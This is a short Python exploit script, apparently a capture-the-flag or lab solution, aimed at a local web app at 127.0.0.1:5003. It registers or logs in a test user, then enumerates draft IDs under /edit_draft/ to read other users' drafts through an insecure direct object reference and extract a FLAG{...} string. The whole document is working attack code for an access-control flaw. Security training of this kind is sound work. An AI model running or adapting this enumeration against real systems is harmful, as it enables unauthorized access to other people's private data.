import requests
import re

def exploit_idor():
    BASE_URL = "http://127.0.0.1:5003"
    session = requests.Session()
    
    login_data = {"username": "testuser", "password": "test123"}
    
    resp = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
    
    if resp.status_code != 302 and "does not exist" in resp.text:
        session.post(f"{BASE_URL}/register", data=login_data)
        resp = session.post(f"{BASE_URL}/login", data=login_data)
    
    drafts_resp = session.get(f"{BASE_URL}/admin/drafts")
    
    if drafts_resp.status_code == 200:
        draft_ids = re.findall(r'/edit_draft/(\d+)', drafts_resp.text)
        
        if not draft_ids:
            draft_ids = [str(i) for i in range(1, 20)]
        
        for draft_id in set(draft_ids):
            draft_resp = session.get(f"{BASE_URL}/edit_draft/{draft_id}")
            
            if draft_resp.status_code == 200:
                flag = re.search(r'FLAG\{[^}]+\}', draft_resp.text)
                if flag:
                    print(f"FLAG: {flag.group(0)}")
                    return flag.group(0)
    
    return None

result = exploit_idor()
if result:
    print(f"Success: {result}")
else:
    print("No flag found")

